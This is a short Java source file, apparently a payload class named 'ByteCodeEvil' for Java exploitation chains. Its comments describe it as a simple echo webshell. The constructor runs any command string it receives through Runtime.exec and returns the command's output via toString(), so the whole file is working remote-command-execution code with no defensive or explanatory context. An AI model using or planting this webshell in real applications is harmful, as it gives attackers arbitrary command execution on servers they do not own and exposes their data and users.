package com;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ByteCodeEvil {
    String res;
    public ByteCodeEvil(String cmd) throws IOException {
        // 简单回显 Webshell
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        // 回显
        return res;
    }
}
